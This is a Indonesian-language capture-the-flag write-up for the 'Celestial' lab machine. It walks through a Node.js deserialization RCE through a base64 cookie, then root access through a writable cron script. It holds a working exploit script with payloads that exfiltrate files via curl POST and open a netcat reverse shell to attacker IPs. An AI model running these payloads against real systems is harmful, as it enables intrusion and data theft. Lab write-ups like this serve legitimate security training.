**Machine**: Celestial  
**OS**: Linux  
**Difficulty**: Medium  
**IP**: 10.10.10.85
**Tools Used**: Rustscan, Node.js, pspy64, netcat  
**Key Techniques**: Deserialization Attacks, Cron Job Exploitation, Race Condition
## Reconnaissance

### Port Scanning

Menggunakan Rustscan untuk enumerasi port
```bash
rustscan -a 10.10.10.85 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
3000/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```
### Web Service Enumeration

Service berjalan pada port 3000 dengan teknologi Node.js. Analisis response menunjukkan penggunaan cookie yang menarik:

**Cookie Structure**:
```json
{"username":"Dummy",
"country":"Idk Probably Somewhere Dumb",
"city":"Lametown",
"num":"2"}
```
aat di-refresh, response berubah menjadi: `Hey Dummy 2 + 2 is 22`
```js
Hey Dummy 2 + 2 is 22
```
```bash
echo -n '{"username":"admin","country":"Idk","city":"Lametown","num":"2"}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIiwiY291bnRyeSI6IklkayIsImNpdHkiOiJMYW1ldG93biIsIm51
bSI6IjIifQ==
```


## Vulnerability Discovery

### Node.js Deserialization

Setelah testing, teridentifikasi vulnerability **Node.js Deserialization** pada cookie `profile`. Cookie diencode dalam Base64 dan dapat dimanipulasi untuk RCE.

**Referensi**: [Exploiting Node.js Deserialization Bug for RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

## Exploitation

### Proof of Concept

Membuat payload untuk mengkonfirmasi RCE
```js
const axios = require('axios');


const payload1 = {
    "username": "_$$ND_FUNC$$_require('child_process').exec('ls -al / > /var/www/html/listing.txt', function(error, stdout, stderr) { })",
    "country": "Idk",
    "city": "Lametown", 
    "num": "5"
};


const payload2 = {
    "username": "_$$ND_FUNC$$_require('child_process').exec('ls -al | curl -X POST -d @- http://10.10.14.8:8888/', function(error, stdout, stderr) { })",
    "country": "Idk",
    "city": "Lametown", 
    "num": "5"
};


const payload3 = {
    "username": "_$$ND_FUNC$$_require('child_process').exec('ls -al > listing.txt', function(error, stdout, stderr) { })",
    "country": "Idk",
    "city": "Lametown", 
    "num": "5"
};


const payload4 = {
    "username": "_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.33 5555 >/tmp/f', function(error, stdout, stderr) { })",
    "country": "Idk",
    "city": "Lametown", 
    "num": "5"
};


const payload5 = {
    "username": "_$$ND_FUNC$$_require('child_process').exec('ls -al > /tmp/output.txt && python3 -m http.server 8080 --directory /tmp 2>/dev/null &', function(error, stdout, stderr) { })",
    "country": "Idk",
    "city": "Lametown", 
    "num": "5"
};

const payloads = [payload1, payload2, payload3, payload4, payload5];
const payloadNames = ["Web Directory", "Curl Exfil", "Current Dir", "Reverse Shell", "Python Server"];

const targetURL = 'http://10.10.10.85:3000/';

async function testAllPayloads() {
    for (let i = 0; i < payloads.length; i++) {
        console.log(`\n=== Testing: ${payloadNames[i]} ===`);
        
        const base64Data = Buffer.from(JSON.stringify(payloads[i])).toString('base64');
        console.log('Base64:', base64Data.substring(0, 100) + '...');
        
        try {
            const response = await axios.get(targetURL, {
                headers: {
                    'Cookie': `profile=${base64Data}`
                },
                timeout: 5000
            });
            
            console.log('Status:', response.status);
            console.log('Response:', response.data);
            
        } catch (error) {
            if (error.response) {
                console.log('Status:', error.response.status);
                console.log('Response:', error.data);
            } else {
                console.log('Error:', error.message);
            }
        }
        
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
}

testAllPayloads();


console.log('\n=== Checking for output files ===');
setTimeout(async () => {
    try {
        const response = await axios.get('http://10.10.10.85/listing.txt', { timeout: 5000 });
        console.log('Found listing.txt:', response.data);
    } catch (e) {
        console.log('listing.txt not accessible');
    }
    
    try {
        const response = await axios.get('http://10.10.10.85:3000/listing.txt', { timeout: 5000 });
        console.log('Found listing.txt on port 3000:', response.data);
    } catch (e) {
        console.log('listing.txt not accessible on port 3000');
    }
}, 8000);
```

## Post Exploitation

### User Access

Berhasil mendapatkan reverse shell sebagai user default. Melakukan enumerasi sistem dan menemukan user `sun`.
### Privilege Escalation

#### Cron Job Analysis

Menggunakan `pspy64` untuk monitoring processes, ditemukan cron job menarik
```bash
2025/11/11 11:10:01 CMD: UID=0     PID=31726  | python /home/sun/Documents/script.py 
2025/11/11 11:10:01 CMD: UID=0     PID=31725  | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py 
2025/11/11 11:10:01 CMD: UID=0     PID=31724  | /usr/sbin/CRON -f 
2025/11/11 11:10:01 CMD: UID=0     PID=31727  | cp /root/script.py /home/sun/Documents/script.py 
2025/11/11 11:10:01 CMD: UID=0     PID=31728  | chown sun:sun /home/sun/Documents/script.py 
2025/11/11 11:10:01 CMD: UID=0     PID=31729  | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py 
2025/11/11 11:10:01 CMD: UID=0     PID=31730  | date -R -r /home/sun/Documents/user.txt 
2025/11/11 11:10:01 CMD: UID=0     PID=31731  | 

```
#### Vulnerability Analysis

Cron job tersebut:

1. Menjalankan `script.py` sebagai **root** setiap menit
    
2. Setelah execution, mengganti file dengan versi dari `/root/script.py`
    
3. Terdapat **race condition** - kita bisa modify script sebelum di-execute root
#### Exploitation

Memanipulasi `/home/sun/Documents/script.py`
```bash
echo 'import os; os.system("cat /root/root.txt > /home/sun/root.txt")' > /home/sun/Documents/script.py
```

Menunggu cron job execute (setiap menit) dan root flag berhasil didapatkan

